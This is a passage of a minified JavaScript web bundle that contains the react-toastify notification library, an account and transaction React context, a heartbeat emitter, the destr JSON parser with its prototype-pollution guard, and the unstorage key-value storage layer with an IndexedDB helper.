            }
            function f() {
                r(!1)
            }
            function p(r) {
                let n = i.current;
                if (s.canDrag && n) {
                    s.didMove = !0,
                    t && f(),
                    "x" === e.draggableDirection ? s.delta = r.clientX - s.start : s.delta = r.clientY - s.start,
                    s.start !== r.clientX && (s.canCloseOnClick = !1);
                    let o = "x" === e.draggableDirection ? "".concat(s.delta, "px, var(--y)") : "0, calc(".concat(s.delta, "px + var(--y))");
                    n.style.transform = "translate3d(".concat(o, ",0)"),
                    n.style.opacity = "".concat(1 - Math.abs(s.delta / s.removalDistance))
                }
            }
            function g() {
                document.removeEventListener("pointermove", p),
                document.removeEventListener("pointerup", g);
                let t = i.current;
                if (s.canDrag && s.didMove && t) {
                    if (s.canDrag = !1,
                    Math.abs(s.delta) > s.removalDistance)
                        return o(!0),
                        e.closeToast(!0),
                        void e.collapseAll();
                    t.style.transition = "transform 0.2s, opacity 0.2s",
                    t.style.removeProperty("transform"),
                    t.style.removeProperty("opacity")
                }
            }
            (function(e) {
                var t;
                null == (t = J.get(e.containerId || 1)) || t.setToggle(e.id, e.fn)
            }
            )({
                id: e.toastId,
                containerId: e.containerId,
                fn: r
            }),
            (0,
            _.useEffect)(( () => {
                if (e.pauseOnFocusLoss)
                    return document.hasFocus() || f(),
                    window.addEventListener("focus", h),
                    window.addEventListener("blur", f),
                    () => {
                        window.removeEventListener("focus", h),
                        window.removeEventListener("blur", f)
                    }
            }
            ), [e.pauseOnFocusLoss]);
            let y = {
                onPointerDown: function(t) {
                    if (!0 === e.draggable || e.draggable === t.pointerType) {
                        s.didMove = !1,
                        document.addEventListener("pointermove", p),
                        document.addEventListener("pointerup", g);
                        let r = i.current;
                        s.canCloseOnClick = !0,
                        s.canDrag = !0,
                        r.style.transition = "none",
                        "x" === e.draggableDirection ? (s.start = t.clientX,
                        s.removalDistance = r.offsetWidth * (e.draggablePercent / 100)) : (s.start = t.clientY,
                        s.removalDistance = r.offsetHeight * (80 === e.draggablePercent ? 1.5 * e.draggablePercent : e.draggablePercent) / 100)
                    }
                },
                onPointerUp: function(t) {
                    let {top: r, bottom: n, left: o, right: s} = i.current.getBoundingClientRect();
                    "touchend" !== t.nativeEvent.type && e.pauseOnHover && t.clientX >= o && t.clientX <= s && t.clientY >= r && t.clientY <= n ? f() : h()
                }
            };
            return a && c && (y.onMouseEnter = f,
            e.stacked || (y.onMouseLeave = h)),
            d && (y.onClick = e => {
                u && u(e),
                s.canCloseOnClick && l(!0)
            }
            ),
            {
                playToast: h,
                pauseToast: f,
                isRunning: t,
                preventExitTransition: n,
                toastRef: i,
                eventHandlers: y
            }
        }
        de.loading = (e, t) => ce(e, le("default", (0,
        k.A)({
            isLoading: !0,
            autoClose: !1,
            closeOnClick: !1,
            closeButton: !1,
            draggable: !1
        }, t))),
        de.promise = function(e, t, r) {
            let n, {pending: o, error: i, success: s} = t;
            o && (n = D(o) ? de.loading(o, r) : de.loading(o.render, (0,
            k.A)((0,
            k.A)({}, r), o)));
            let a = {
                isLoading: null,
                autoClose: null,
                closeOnClick: null,
                closeButton: null,
                draggable: null
            }
              , c = (e, t, o) => {
                if (null == t)
                    return void de.dismiss(n);
                let i = (0,
                k.A)((0,
                k.A)((0,
                k.A)({
                    type: e
                }, a), r), {}, {
                    data: o
                })
                  , s = D(t) ? {
                    render: t
                } : t;
                return n ? de.update(n, (0,
                k.A)((0,
                k.A)({}, i), s)) : de(s.render, (0,
                k.A)((0,
                k.A)({}, i), s)),
                o
            }
              , l = L(e) ? e() : e;
            return l.then((e => c("success", s, e))).catch((e => c("error", i, e))),
            l
        }
        ,
        de.success = ue("success"),
        de.info = ue("info"),
        de.error = ue("error"),
        de.warning = ue("warning"),
        de.warn = de.warning,
        de.dark = (e, t) => ce(e, le("default", (0,
        k.A)({
            theme: "dark"
        }, t))),
        de.dismiss = function(e) {
            ne(e)
        }
        ,
        de.clearWaitingQueue = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            J.forEach((t => {
                t.props.limit && (!e.containerId || t.id === e.containerId) && t.clearQueue()
            }
            ))
        }
        ,
        de.isActive = re,
        de.update = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
              , r = ( (e, t) => {
                let {containerId: r} = t;
                var n;
                return null == (n = J.get(r || 1)) ? void 0 : n.toasts.get(e)
            }
            )(e, t);
            if (r) {
                let {props: n, content: o} = r
                  , i = (0,
                k.A)((0,
                k.A)((0,
                k.A)({
                    delay: 100
                }, n), t), {}, {
                    toastId: t.toastId || e,
                    updateId: Z()
                });
                i.toastId !== e && (i.staleId = e);
                let s = i.render || o;
                delete i.render,
                ce(s, i)
            }
        }
        ,
        de.done = e => {
            de.update(e, {
                progress: 1
            })
        }
        ,
        de.onChange = function(e) {
            return Q.add(e),
            () => {
                Q.delete(e)
            }
        }
        ,
        de.play = e => ie(!0, e),
        de.pause = e => ie(!1, e);
        var fe = "undefined" != typeof window ? _.useLayoutEffect : _.useEffect
          , pe = e => {
            let {theme: t, type: r, isLoading: n} = e
              , o = R(e, F);
            return _.createElement("svg", (0,
            k.A)({
                viewBox: "0 0 24 24",
                width: "100%",
                height: "100%",
                fill: "colored" === t ? "currentColor" : "var(--toastify-icon-color-".concat(r, ")")
            }, o))
        }
        ;
        var ge = {
            info: function(e) {
                return _.createElement(pe, (0,
                k.A)({}, e), _.createElement("path", {
                    d: "M12 0a12 12 0 1012 12A12.013 12.013 0 0012 0zm.25 5a1.5 1.5 0 11-1.5 1.5 1.5 1.5 0 011.5-1.5zm2.25 13.5h-4a1 1 0 010-2h.75a.25.25 0 00.25-.25v-4.5a.25.25 0 00-.25-.25h-.75a1 1 0 010-2h1a2 2 0 012 2v4.75a.25.25 0 00.25.25h.75a1 1 0 110 2z"
                }))
            },
            warning: function(e) {
                return _.createElement(pe, (0,
                k.A)({}, e), _.createElement("path", {
                    d: "M23.32 17.191L15.438 2.184C14.728.833 13.416 0 11.996 0c-1.42 0-2.733.833-3.443 2.184L.533 17.448a4.744 4.744 0 000 4.368C1.243 23.167 2.555 24 3.975 24h16.05C22.22 24 24 22.044 24 19.632c0-.904-.251-1.746-.68-2.44zm-9.622 1.46c0 1.033-.724 1.823-1.698 1.823s-1.698-.79-1.698-1.822v-.043c0-1.028.724-1.822 1.698-1.822s1.698.79 1.698 1.822v.043zm.039-12.285l-.84 8.06c-.057.581-.408.943-.897.943-.49 0-.84-.367-.896-.942l-.84-8.065c-.057-.624.25-1.095.779-1.095h1.91c.528.005.84.476.784 1.1z"
                }))
            },
            success: function(e) {
                return _.createElement(pe, (0,
                k.A)({}, e), _.createElement("path", {
                    d: "M12 0a12 12 0 1012 12A12.014 12.014 0 0012 0zm6.927 8.2l-6.845 9.289a1.011 1.011 0 01-1.43.188l-4.888-3.908a1 1 0 111.25-1.562l4.076 3.261 6.227-8.451a1 1 0 111.61 1.183z"
                }))
            },
            error: function(e) {
                return _.createElement(pe, (0,
                k.A)({}, e), _.createElement("path", {
                    d: "M11.983 0a12.206 12.206 0 00-8.51 3.653A11.8 11.8 0 000 12.207 11.779 11.779 0 0011.8 24h.214A12.111 12.111 0 0024 11.791 11.766 11.766 0 0011.983 0zM10.5 16.542a1.476 1.476 0 011.449-1.53h.027a1.527 1.527 0 011.523 1.47 1.475 1.475 0 01-1.449 1.53h-.027a1.529 1.529 0 01-1.523-1.47zM11 12.5v-6a1 1 0 012 0v6a1 1 0 11-2 0z"
                }))
            },
            spinner: function() {
                return _.createElement("div", {
                    className: "Toastify__spinner"
                })
            }
        };
        function ye(e) {
            let {theme: t, type: r, isLoading: n, icon: o} = e
              , i = null
              , s = {
                theme: t,
                type: r
            };
            return !1 === o || (L(o) ? i = o((0,
            k.A)((0,
            k.A)({}, s), {}, {
                isLoading: n
            })) : (0,
            _.isValidElement)(o) ? i = (0,
            _.cloneElement)(o, s) : n ? i = ge.spinner() : (e => e in ge)(r) && (i = ge[r](s))),
            i
        }
        var me = e => {
            let {isRunning: t, preventExitTransition: r, toastRef: n, eventHandlers: o, playToast: i} = he(e)
              , {closeButton: s, children: a, autoClose: c, onClick: l, type: u, hideProgressBar: d, closeToast: h, transition: f, position: p, className: g, style: y, progressClassName: m, updateId: b, role: v, progress: w, rtl: T, toastId: A, deleteToast: E, isIn: P, isLoading: C, closeOnClick: S, theme: I, ariaLabel: B} = e
              , x = N("Toastify__toast", "Toastify__toast-theme--".concat(I), "Toastify__toast--".concat(u), {
                "Toastify__toast--rtl": T
            }, {
                "Toastify__toast--close-on-click": S
            })
              , O = L(g) ? g({
                rtl: T,
                position: p,
                type: u,
                defaultClassName: x
            }) : N(x, g)
              , W = ye(e)
              , R = !!w || !c
              , M = {
                closeToast: h,
                type: u,
                theme: I
            }
              , F = null;
            return !1 === s || (F = L(s) ? s(M) : (0,
            _.isValidElement)(s) ? (0,
            _.cloneElement)(s, M) : function(e) {
                let {closeToast: t, theme: r, ariaLabel: n="close"} = e;
                return _.createElement("button", {
                    className: "Toastify__close-button Toastify__close-button--".concat(r),
                    type: "button",
                    onClick: e => {
                        e.stopPropagation(),
                        t(!0)
                    }
                    ,
                    "aria-label": n
                }, _.createElement("svg", {
                    "aria-hidden": "true",
                    viewBox: "0 0 14 16"
                }, _.createElement("path", {
                    fillRule: "evenodd",
                    d: "M7.71 8.23l3.75 3.75-1.48 1.48-3.75-3.75-3.75 3.75L1 11.98l3.75-3.75L1 4.48 2.48 3l3.75 3.75L9.98 3l1.48 1.48-3.75 3.75z"
                })))
            }(M)),
            _.createElement(f, {
                isIn: P,
                done: E,
                position: p,
                preventExitTransition: r,
                nodeRef: n,
                playToast: i
            }, _.createElement("div", (0,
            k.A)((0,
            k.A)({
                id: A,
                tabIndex: 0,
                onClick: l,
                "data-in": P,
                className: O
            }, o), {}, {
                style: y,
                ref: n
            }, P && {
                role: v,
                "aria-label": B
            }), null != W && _.createElement("div", {
                className: N("Toastify__toast-icon", {
                    "Toastify--animate-icon Toastify__zoom-enter": !C
                })
            }, W), G(a, e, !t), F, !e.customProgressBar && _.createElement($, (0,
            k.A)((0,
            k.A)({}, b && !R ? {
                key: "p-".concat(b)
            } : {}), {}, {
                rtl: T,
                theme: I,
                delay: c,
                isRunning: t,
                isIn: P,
                closeToast: h,
                hide: d,
                type: u,
                className: m,
                controlledProgress: R,
                progress: w || 0
            }))))
        }
          , be = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            return {
                enter: "Toastify--animate Toastify__".concat(e, "-enter"),
                exit: "Toastify--animate Toastify__".concat(e, "-exit"),
                appendPosition: t
            }
        }
          , ve = H(be("bounce", !0))
          , we = (H(be("slide", !0)),
        H(be("zoom")),
        H(be("flip")),
        {
            position: "top-right",
            transition: ve,
            autoClose: 5e3,
            closeButton: !0,
            pauseOnHover: !0,
            pauseOnFocusLoss: !0,
            draggable: "touch",
            draggablePercent: 80,
            draggableDirection: "x",
            role: "alert",
            theme: "light",
            "aria-label": "Notifications Alt+T",
            hotKeys: e => e.altKey && "KeyT" === e.code
        });
        function Te(e) {
            let t = (0,
            k.A)((0,
            k.A)({}, we), e)
              , r = e.stacked
              , [n,o] = (0,
            _.useState)(!0)
              , i = (0,
            _.useRef)(null)
              , {getToastToRender: s, isToastActive: a, count: c} = function(e) {
                var t;
                let {subscribe: r, getSnapshot: n, setProps: o} = (0,
                _.useRef)(se(e)).current;
                o(e);
                let i = null == (t = (0,
                _.useSyncExternalStore)(r, n, n)) ? void 0 : t.slice();
                return {
                    getToastToRender: function(t) {
                        if (!i)
                            return [];
                        let r = new Map;
                        return e.newestOnTop && i.reverse(),
                        i.forEach((e => {
                            let {position: t} = e.props;
                            r.has(t) || r.set(t, []),
                            r.get(t).push(e)
                        }
                        )),
                        Array.from(r, (e => t(e[0], e[1])))
                    },
                    isToastActive: re,
                    count: null == i ? void 0 : i.length
                }
            }(t)
              , {className: l, style: u, rtl: d, containerId: h, hotKeys: f} = t;
            function p(e) {
                let t = N("Toastify__toast-container", "Toastify__toast-container--".concat(e), {
                    "Toastify__toast-container--rtl": d
                });
                return L(l) ? l({
                    position: e,
                    rtl: d,
                    defaultClassName: t
                }) : N(t, j(l))
            }
            function g() {
                r && (o(!0),
                de.play())
            }
            return fe(( () => {
                var e;
                if (r) {
                    let r = i.current.querySelectorAll('[data-in="true"]')
                      , o = 12
                      , s = null == (e = t.position) ? void 0 : e.includes("top")
                      , a = 0
                      , c = 0;
                    Array.from(r).reverse().forEach(( (e, t) => {
                        let r = e;
                        r.classList.add("Toastify__toast--stacked"),
                        t > 0 && (r.dataset.collapsed = "".concat(n)),
                        r.dataset.pos || (r.dataset.pos = s ? "top" : "bot");
                        let i = a * (n ? .2 : 1) + (n ? 0 : o * t);
                        r.style.setProperty("--y", "".concat(s ? i : -1 * i, "px")),
                        r.style.setProperty("--g", "".concat(o)),
                        r.style.setProperty("--s", "".concat(1 - (n ? c : 0))),
                        a += r.offsetHeight,
                        c += .025
                    }
                    ))
                }
            }
            ), [n, c, r]),
            (0,
            _.useEffect)(( () => {
                function e(e) {
                    var t;
                    let r = i.current;
                    f(e) && (null == (t = r.querySelector('[tabIndex="0"]')) || t.focus(),
                    o(!1),
                    de.pause()),
                    "Escape" === e.key && (document.activeElement === r || null != r && r.contains(document.activeElement)) && (o(!0),
                    de.play())
                }
                return document.addEventListener("keydown", e),
                () => {
                    document.removeEventListener("keydown", e)
                }
            }
            ), [f]),
            _.createElement("section", {
                ref: i,
                className: "Toastify",
                id: h,
                onMouseEnter: () => {
                    r && (o(!1),
                    de.pause())
                }
                ,
                onMouseLeave: g,
                "aria-live": "polite",
                "aria-atomic": "false",
                "aria-relevant": "additions text",
                "aria-label": t["aria-label"]
            }, s(( (e, t) => {
                let n = t.length ? (0,
                k.A)({}, u) : (0,
                k.A)((0,
                k.A)({}, u), {}, {
                    pointerEvents: "none"
                });
                return _.createElement("div", {
                    tabIndex: -1,
                    className: p(e),
                    "data-stacked": r,
                    style: n,
                    key: "c-".concat(e)
                }, t.map((e => {
                    let {content: t, props: n} = e;
                    return _.createElement(me, (0,
                    k.A)((0,
                    k.A)({}, n), {}, {
                        stacked: r,
                        collapseAll: g,
                        isIn: a(n.toastId, n.containerId),
                        key: "t-".concat(n.key)
                    }), t)
                }
                )))
            }
            )))
        }
        var Ae = r(579);
        const Ee = (0,
        _.createContext)({
            account: void 0,
            tx: void 0,
            setAccount: () => {}
            ,
            setTx: () => {}
        })
          , Pe = e => {
            let {children: t} = e;
            const [r,n] = (0,
            _.useState)()
              , [o,i] = (0,
            _.useState)();
            return (0,
            Ae.jsx)(Ee.Provider, {
                value: {
                    account: r,
                    tx: o,
                    setAccount: n,
                    setTx: i
                },
                children: t
            })
        }
          , Ce = () => (0,
        _.useContext)(Ee);
        var Se = r(7284)
          , Ie = r.n(Se)
          , Be = r(3901);
        class xe {
        }
        class Oe extends xe {
            constructor(e) {
                super()
            }
        }
        const _e = Be.FIVE_SECONDS
          , We = "heartbeat_pulse";
        class Re extends Oe {
            constructor(e) {
                super(e),
                this.events = new Se.EventEmitter,
                this.interval = _e,
                this.interval = (null === e || void 0 === e ? void 0 : e.interval) || _e
            }
            static async init(e) {
                const t = new Re(e);
                return await t.init(),
                t
            }
            async init() {
                await this.initialize()
            }
            stop() {
                clearInterval(this.intervalRef)
            }
            on(e, t) {
                this.events.on(e, t)
            }
            once(e, t) {
                this.events.once(e, t)
            }
            off(e, t) {
                this.events.off(e, t)
            }
            removeListener(e, t) {
                this.events.removeListener(e, t)
            }
            async initialize() {
                this.intervalRef = setInterval(( () => this.pulse()), (0,
                Be.toMiliseconds)(this.interval))
            }
            pulse() {
                this.events.emit(We)
            }
        }
        const ke = /"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/
          , Me = /"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/
          , Ne = /^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;
        function Fe(e, t) {
            if (!("__proto__" === e || "constructor" === e && t && "object" === typeof t && "prototype"in t))
                return t;
            !function(e) {
                console.warn('[destr] Dropping "'.concat(e, '" key to prevent prototype pollution.'))
            }(e)
        }
        function Ue(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            if ("string" !== typeof e)
                return e;
            if ('"' === e[0] && '"' === e[e.length - 1] && -1 === e.indexOf("\\"))
                return e.slice(1, -1);
            const r = e.trim();
            if (r.length <= 9)
                switch (r.toLowerCase()) {
                case "true":
                    return !0;
                case "false":
                    return !1;
                case "undefined":
                    return;
                case "null":
                    return null;
                case "nan":
                    return Number.NaN;
                case "infinity":
                    return Number.POSITIVE_INFINITY;
                case "-infinity":
                    return Number.NEGATIVE_INFINITY
                }
            if (!Ne.test(e)) {
                if (t.strict)
                    throw new SyntaxError("[destr] Invalid JSON");
                return e
            }
            try {
                if (ke.test(e) || Me.test(e)) {
                    if (t.strict)
                        throw new Error("[destr] Possible prototype pollution");
                    return JSON.parse(e, Fe)
                }
                return JSON.parse(e)
            } catch (n) {
                if (t.strict)
                    throw n;
                return e
            }
        }
        function De(e) {
            try {
                for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                    r[n - 1] = arguments[n];
                return (o = e(...r)) && "function" === typeof o.then ? o : Promise.resolve(o)
            } catch (i) {
                return Promise.reject(i)
            }
            var o
        }
        function Le(e) {
            if (function(e) {
                const t = typeof e;
                return null === e || "object" !== t && "function" !== t
            }(e))
                return String(e);
            if (function(e) {
                const t = Object.getPrototypeOf(e);
                return !t || t.isPrototypeOf(Object)
            }(e) || Array.isArray(e))
                return JSON.stringify(e);
            if ("function" === typeof e.toJSON)
                return Le(e.toJSON());
            throw new Error("[unstorage] Cannot stringify value!")
        }
        const je = "base64:";
        function ze(e) {
            return "string" === typeof e ? e : je + function(e) {
                if (globalThis.Buffer)
                    return Buffer.from(e).toString("base64");
                return globalThis.btoa(String.fromCodePoint(...e))
            }(e)
        }
        function Ve(e) {
            return "string" !== typeof e ? e : e.startsWith(je) ? function(e) {
                if (globalThis.Buffer)
                    return Buffer.from(e, "base64");
                return Uint8Array.from(globalThis.atob(e), (e => e.codePointAt(0)))
            }(e.slice(7)) : e
        }
        function He(e) {
            var t;
            return e && (null === (t = e.split("?")[0]) || void 0 === t ? void 0 : t.replace(/[/\\]/g, ":").replace(/:+/g, ":").replace(/^:|:$/g, "")) || ""
        }
        function qe() {
            for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                t[r] = arguments[r];
            return He(t.join(":"))
        }
        function Ge(e) {
            return (e = He(e)) ? e + ":" : ""
        }
        const $e = () => {
            const e = new Map;
            return {
                name: "memory",
                getInstance: () => e,
                hasItem: t => e.has(t),
                getItem(t) {
                    var r;
                    return null !== (r = e.get(t)) && void 0 !== r ? r : null
                },
                getItemRaw(t) {
                    var r;
                    return null !== (r = e.get(t)) && void 0 !== r ? r : null
                },
                setItem(t, r) {
                    e.set(t, r)
                },
                setItemRaw(t, r) {
                    e.set(t, r)
                },
                removeItem(t) {
                    e.delete(t)
                },
                getKeys: () => [...e.keys()],
                clear() {
                    e.clear()
                },
                dispose() {
                    e.clear()
                }
            }
        }
        ;
        function Ke() {
            const e = {
                mounts: {
                    "": (arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}).driver || $e()
                },
                mountpoints: [""],
                watching: !1,
                watchListeners: [],
                unwatch: {}
            }
              , t = t => {
                for (const r of e.mountpoints)
                    if (t.startsWith(r))
                        return {
                            base: r,
                            relativeKey: t.slice(r.length),
                            driver: e.mounts[r]
                        };
                return {
                    base: "",
                    relativeKey: t,
                    driver: e.mounts[""]
                }
            }
              , r = (t, r) => e.mountpoints.filter((e => e.startsWith(t) || r && t.startsWith(e))).map((r => ({
                relativeBase: t.length > r.length ? t.slice(r.length) : void 0,
                mountpoint: r,
                driver: e.mounts[r]
            })))
              , n = (t, r) => {
                if (e.watching) {
                    r = He(r);
                    for (const n of e.watchListeners)
                        n(t, r)
                }
            }
              , o = async () => {
                if (e.watching) {
                    for (const t in e.unwatch)
                        await e.unwatch[t]();
                    e.unwatch = {},
                    e.watching = !1
                }
            }
              , i = (e, r, n) => {
                const o = new Map
                  , i = e => {
                    let t = o.get(e.base);
                    return t || (t = {
                        driver: e.driver,
                        base: e.base,
                        items: []
                    },
                    o.set(e.base, t)),
                    t
                }
                ;
                for (const s of e) {
                    const e = "string" === typeof s
                      , n = He(e ? s : s.key)
                      , o = e ? void 0 : s.value
                      , a = e || !s.options ? r : (0,
                    k.A)((0,
                    k.A)({}, r), s.options)
                      , c = t(n);
                    i(c).items.push({
                        key: n,
                        value: o,
                        relativeKey: c.relativeKey,
                        options: a
                    })
                }
                return Promise.all([...o.values()].map((e => n(e)))).then((e => e.flat()))
            }
              , s = {
                hasItem(e) {
                    let r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    e = He(e);
                    const {relativeKey: n, driver: o} = t(e);
                    return De(o.hasItem, n, r)
                },
                getItem(e) {
                    let r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    e = He(e);
                    const {relativeKey: n, driver: o} = t(e);
                    return De(o.getItem, n, r).then((e => Ue(e)))
                },
                getItems(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return i(e, t, (e => e.driver.getItems ? De(e.driver.getItems, e.items.map((e => ({
                        key: e.relativeKey,
                        options: e.options
                    }))), t).then((t => t.map((t => ({
                        key: qe(e.base, t.key),
                        value: Ue(t.value)
                    }))))) : Promise.all(e.items.map((t => De(e.driver.getItem, t.relativeKey, t.options).then((e => ({
                        key: t.key,
                        value: Ue(e)
                    }))))))))
                },
                getItemRaw(e) {
                    let r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    e = He(e);
                    const {relativeKey: n, driver: o} = t(e);
                    return o.getItemRaw ? De(o.getItemRaw, n, r) : De(o.getItem, n, r).then((e => Ve(e)))
                },
                async setItem(e, r) {
                    let o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    if (void 0 === r)
                        return s.removeItem(e);
                    e = He(e);
                    const {relativeKey: i, driver: a} = t(e);
                    a.setItem && (await De(a.setItem, i, Le(r), o),
                    a.watch || n("update", e))
                },
                async setItems(e, t) {
                    await i(e, t, (async e => {
                        if (e.driver.setItems)
                            return De(e.driver.setItems, e.items.map((e => ({
                                key: e.relativeKey,
                                value: Le(e.value),
                                options: e.options
                            }))), t);
                        e.driver.setItem && await Promise.all(e.items.map((t => De(e.driver.setItem, t.relativeKey, Le(t.value), t.options))))
                    }
                    ))
                },
                async setItemRaw(e, r) {
                    let o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    if (void 0 === r)
                        return s.removeItem(e, o);
                    e = He(e);
                    const {relativeKey: i, driver: a} = t(e);
                    if (a.setItemRaw)
                        await De(a.setItemRaw, i, r, o);
                    else {
                        if (!a.setItem)
                            return;
                        await De(a.setItem, i, ze(r), o)
                    }
                    a.watch || n("update", e)
                },
                async removeItem(e) {
                    let r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    "boolean" === typeof r && (r = {
                        removeMeta: r
                    }),
                    e = He(e);
                    const {relativeKey: o, driver: i} = t(e);
                    i.removeItem && (await De(i.removeItem, o, r),
                    (r.removeMeta || r.removeMata) && await De(i.removeItem, o + "$", r),
                    i.watch || n("remove", e))
                },
                async getMeta(e) {
                    let r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    "boolean" === typeof r && (r = {
                        nativeOnly: r
                    }),
                    e = He(e);
                    const {relativeKey: n, driver: o} = t(e)
                      , i = Object.create(null);
                    if (o.getMeta && Object.assign(i, await De(o.getMeta, n, r)),
                    !r.nativeOnly) {
                        const e = await De(o.getItem, n + "$", r).then((e => Ue(e)));
                        e && "object" === typeof e && ("string" === typeof e.atime && (e.atime = new Date(e.atime)),
                        "string" === typeof e.mtime && (e.mtime = new Date(e.mtime)),
                        Object.assign(i, e))
                    }
                    return i
                },
                setMeta(e, t) {
                    let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    return this.setItem(e + "$", t, r)
                },
                removeMeta(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return this.removeItem(e + "$", t)
                },
                async getKeys(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    e = Ge(e);
                    const n = r(e, !0);
                    let o = [];
                    const i = [];
                    let s = !0;
                    for (const r of n) {
                        var a;
                        null !== (a = r.driver.flags) && void 0 !== a && a.maxDepth || (s = !1);
                        const e = await De(r.driver.getKeys, r.relativeBase, t);
                        for (const t of e) {
                            const e = r.mountpoint + He(t);
                            o.some((t => e.startsWith(t))) || i.push(e)
                        }
                        o = [r.mountpoint, ...o.filter((e => !e.startsWith(r.mountpoint)))]
                    }
                    const c = void 0 !== t.maxDepth && !s;
                    return i.filter((r => (!c || function(e, t) {
                        if (void 0 === t)
                            return !0;
                        let r = 0
                          , n = e.indexOf(":");
                        for (; n > -1; )
                            r++,
                            n = e.indexOf(":", n + 1);
                        return r <= t
                    }(r, t.maxDepth)) && function(e, t) {
                        return t ? e.startsWith(t) && "$" !== e[e.length - 1] : "$" !== e[e.length - 1]
                    }(r, e)))
                },
                async clear(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    e = Ge(e),
                    await Promise.all(r(e, !1).map((async e => {
                        if (e.driver.clear)
                            return De(e.driver.clear, e.relativeBase, t);
                        if (e.driver.removeItem) {
                            const r = await e.driver.getKeys(e.relativeBase || "", t);
                            return Promise.all(r.map((r => e.driver.removeItem(r, t))))
                        }
                    }
                    )))
                },
                async dispose() {
                    await Promise.all(Object.values(e.mounts).map((e => Ye(e))))
                },
                watch: async t => (await (async () => {
                    if (!e.watching) {
                        e.watching = !0;
                        for (const t in e.mounts)
                            e.unwatch[t] = await Ze(e.mounts[t], n, t)
                    }
                }
                )(),
                e.watchListeners.push(t),
                async () => {
                    e.watchListeners = e.watchListeners.filter((e => e !== t)),
                    0 === e.watchListeners.length && await o()
                }
                ),
                async unwatch() {
                    e.watchListeners = [],
                    await o()
                },
                mount(t, r) {
                    if ((t = Ge(t)) && e.mounts[t])
                        throw new Error("already mounted at ".concat(t));
                    return t && (e.mountpoints.push(t),
                    e.mountpoints.sort(( (e, t) => t.length - e.length))),
                    e.mounts[t] = r,
                    e.watching && Promise.resolve(Ze(r, n, t)).then((r => {
                        e.unwatch[t] = r
                    }
                    )).catch(console.error),
                    s
                },
                async unmount(t) {
                    let r = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                    if ((t = Ge(t)) && e.mounts[t]) {
                        var n, o;
                        if (e.watching && t in e.unwatch)
                            null === (n = (o = e.unwatch)[t]) || void 0 === n || n.call(o),
                            delete e.unwatch[t];
                        r && await Ye(e.mounts[t]),
                        e.mountpoints = e.mountpoints.filter((e => e !== t)),
                        delete e.mounts[t]
                    }
                },
                getMount() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                    e = He(e) + ":";
                    const r = t(e);
                    return {
                        driver: r.driver,
                        base: r.base
                    }
                },
                getMounts() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
                      , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    e = He(e);
                    return r(e, t.parents).map((e => ({
                        driver: e.driver,
                        base: e.mountpoint
                    })))
                },
                keys: function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return s.getKeys(e, t)
                },
                get: function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return s.getItem(e, t)
                },
                set: function(e, t) {
                    let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    return s.setItem(e, t, r)
                },
                has: function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return s.hasItem(e, t)
                },
                del: function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return s.removeItem(e, t)
                },
                remove: function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    return s.removeItem(e, t)
                }
            };
            return s
        }
        function Ze(e, t, r) {
            return e.watch ? e.watch(( (e, n) => t(e, r + n))) : () => {}
        }
        async function Ye(e) {
            "function" === typeof e.dispose && await De(e.dispose)
        }
        function Je(e) {
            return new Promise(( (t, r) => {
                e.oncomplete = e.onsuccess = () => t(e.result),
                e.onabort = e.onerror = () => r(e.error)
            }
            ))
        }
        function Xe(e, t) {
            let r;
            return (n, o) => ( () => {
                if (r)
                    return r;
                const n = indexedDB.open(e);
                return n.onupgradeneeded = () => n.result.createObjectStore(t),
                r = Je(n),
                r.then((e => {
                    e.onclose = () => r = void 0
                }
                ), ( () => {}
                )),
                r
            }
            )().then((e => o(e.transaction(t, n).objectStore(t))))
        }
        let Qe;
        function et() {
            return Qe || (Qe = Xe("keyval-store", "keyval")),
            Qe
        }
        function tt(e) {
            return (arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : et())("readonly", (t => Je(t.get(e))))
        }
        function rt(e, t) {
